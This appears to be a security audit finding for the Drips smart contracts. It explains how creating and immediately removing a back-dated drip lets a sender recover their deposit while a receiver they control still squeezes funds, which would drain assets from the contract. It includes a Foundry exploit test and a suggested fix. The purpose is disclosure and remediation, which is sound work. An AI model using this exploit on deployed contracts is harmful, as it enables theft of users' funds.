# Vulnerability details

## Impact
By creating a drip that ends after the current cycle but before its creation time and immediately removing it, the sender doesn't have to put in any assets but the receiver can still squeeze this drip.

By setting a receiver that the sender controls, the sender can drain arbitrary asset from the contract.

## Proof of Concept
Let the cycle length be 10 seconds. By i-th second I mean the i-th second of the cycle.
At the 5th second, sender creates a drip that starts at 0th second and lasts for 2 seconds.
At the 6th second, sender removes this drip.

https://github.com/code-423n4/2023-01-drips/blob/main/src/Drips.sol#L569
Since the drip ends before it was created, the dripped amount is 0, so the sender can retrieve their full balance.

https://github.com/code-423n4/2023-01-drips/blob/main/src/Drips.sol#L425-L430
https://github.com/code-423n4/2023-01-drips/blob/main/src/Drips.sol#L490-L496
Now the receiver squeezes from this drip. SqueezeStartCap = _currCycleStart() = 0th second, squeezeEndCap = 6th second, so the receiver can still squeeze out the full amount even though the sender has withdrawn all of his balance.

Please add the following test to DripsHub.t.sol. It verifies that the sender has retrieved all of his assets but the receiver can still squeeze.
```
    function customSetDrips(
        uint256 forUser,
        uint128 balanceFrom,
        uint128 balanceTo,
        DripsReceiver[] memory newReceivers
    ) internal {
        int128 balanceDelta = int128(balanceTo) - int128(balanceFrom);
        DripsReceiver[] memory currReceivers = loadDrips(forUser);

        vm.prank(driver);
        int128 realBalanceDelta =
            dripsHub.setDrips(forUser, erc20, currReceivers, balanceDelta, newReceivers, 0, 0);

        storeDrips(forUser, newReceivers);

    }

    function testExploitSqueeze() public {
        skipToCycleEnd();
        // Start dripping
        DripsReceiver[] memory receivers = new DripsReceiver[](1);
        receivers[0] = DripsReceiver(
            receiver,
            DripsConfigImpl.create(0, uint160(1 * dripsHub.AMT_PER_SEC_MULTIPLIER()), uint32(block.timestamp), 2)
        );

        DripsHistory[] memory history = new DripsHistory[](2);

        uint256 balanceBefore = balance();
        skip(5);
        customSetDrips(user, 0, 2, receivers);
        (,, uint32 lastUpdate,, uint32 maxEnd) = dripsHub.dripsState(user, erc20);
        history[0] = DripsHistory(0, receivers, lastUpdate, maxEnd);

        skip(1);
        receivers = dripsReceivers();
        customSetDrips(user, 2, 0, receivers);
        (,, lastUpdate,, maxEnd) = dripsHub.dripsState(user, erc20);
        history[1] = DripsHistory(0, receivers, lastUpdate, maxEnd);

        assertBalance(balanceBefore);

        // Squeeze
        vm.prank(driver);
        uint128 amt = dripsHub.squeezeDrips(receiver, erc20, user, 0, history);
        assertEq(amt, 2, "Invalid squeezed amt");
    }
```

## Tools Used
VSCode, Foundry

## Recommended Mitigation Steps
https://github.com/code-423n4/2023-01-drips/blob/main/src/Drips.sol#L426
One potential solution is to add an additional check after this line. Something along the lines of:
`if (squeezeStartCap < drips.updateTime) squeezeStartCap = drips.updateTime;`

code:
function _squeezeDripsResult(
    uint256 userId,
    uint256 assetId,
    uint256 senderId,
    bytes32 historyHash,
    DripsHistory[] memory dripsHistory
)
    internal
    view
    returns (
        uint128 amt,
        uint256 squeezedNum,
        uint256[] memory squeezedRevIdxs,
        bytes32[] memory historyHashes,
        uint256 currCycleConfigs
    )
{
    {
        DripsState storage sender = _dripsStorage().states[assetId][senderId];
        historyHashes = _verifyDripsHistory(historyHash, dripsHistory, sender.dripsHistoryHash);
        // If the last update was not in the current cycle,
        // there's only the single latest history entry to squeeze in the current cycle.
        currCycleConfigs = 1;
        // slither-disable-next-line timestamp
        if (sender.updateTime >= _currCycleStart()) currCycleConfigs = sender.currCycleConfigs;
    }
    squeezedRevIdxs = new uint256[](dripsHistory.length);
    uint32[2 ** 32] storage nextSqueezed =
        _dripsStorage().states[assetId][userId].nextSqueezed[senderId];
    uint32 squeezeEndCap = _currTimestamp();
    for (uint256 i = 1; i <= dripsHistory.length && i <= currCycleConfigs; i++) {
        DripsHistory memory drips = dripsHistory[dripsHistory.length - i];
        if (drips.receivers.length != 0) {
            uint32 squeezeStartCap = nextSqueezed[currCycleConfigs - i];
            if (squeezeStartCap < _currCycleStart()) squeezeStartCap = _currCycleStart();
            if (squeezeStartCap < squeezeEndCap) {
                squeezedRevIdxs[squeezedNum++] = i;
                amt += _squeezedAmt(userId, drips, squeezeStartCap, squeezeEndCap);
            }
        }
        squeezeEndCap = drips.updateTime;
    }
}

function create(uint32 dripId_, uint160 amtPerSec_, uint32 start_, uint32 duration_)
    internal
    pure
    returns (DripsConfig)
{
    uint256 config = dripId_;
    config = (config << 160) | amtPerSec_;
    config = (config << 32) | start_;
    config = (config << 32) | duration_;
    return DripsConfig.wrap(config);
}

function _balanceAt(
    uint128 lastBalance,
    uint32 lastUpdate,
    uint32 maxEnd,
    DripsReceiver[] memory receivers,
    uint32 timestamp
) private view returns (uint128 balance) {
    balance = lastBalance;
    for (uint256 i = 0; i < receivers.length; i++) {
        DripsReceiver memory receiver = receivers[i];
        (uint32 start, uint32 end) = _dripsRange({
            receiver: receiver,
            updateTime: lastUpdate,
            maxEnd: maxEnd,
            startCap: lastUpdate,
            endCap: timestamp
        });
        balance -= uint128(_drippedAmt(receiver.config.amtPerSec(), start, end));
    }
}

function _squeezedAmt(
    uint256 userId,
    DripsHistory memory dripsHistory,
    uint32 squeezeStartCap,
    uint32 squeezeEndCap
) private view returns (uint128 squeezedAmt) {
    DripsReceiver[] memory receivers = dripsHistory.receivers;
    // Binary search for the `idx` of the first occurrence of `userId`
    uint256 idx = 0;
    for (uint256 idxCap = receivers.length; idx < idxCap;) {
        uint256 idxMid = (idx + idxCap) / 2;
        if (receivers[idxMid].userId < userId) {
            idx = idxMid + 1;
        } else {
            idxCap = idxMid;
        }
    }
    uint32 updateTime = dripsHistory.updateTime;
    uint32 maxEnd = dripsHistory.maxEnd;
    uint256 amt = 0;
    for (; idx < receivers.length; idx++) {
        DripsReceiver memory receiver = receivers[idx];
        if (receiver.userId != userId) break;
        (uint32 start, uint32 end) =
            _dripsRange(receiver, updateTime, maxEnd, squeezeStartCap, squeezeEndCap);
        amt += _drippedAmt(receiver.config.amtPerSec(), start, end);
    }
    return uint128(amt);
}
